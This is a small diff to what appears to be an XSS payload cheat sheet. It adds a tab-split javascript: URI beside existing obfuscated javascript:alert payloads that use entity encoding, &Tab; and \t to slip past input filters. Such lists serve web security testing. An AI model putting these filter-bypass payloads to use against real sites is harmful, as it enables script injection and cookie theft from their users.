@@ -37,6 +37,8 @@ window["doc"+"ument"]["cookie"]
 
 ```
 <!--javascript -->
+
+javascript	:alert(1) # tab (0x9), newline (0xa) and carriage return (0xd) allowed
 &#x8; &#23;   javascript:alert('Successful XSS')
 ja&Tab;vascript:alert(1)
 java\tscript:alert(1)
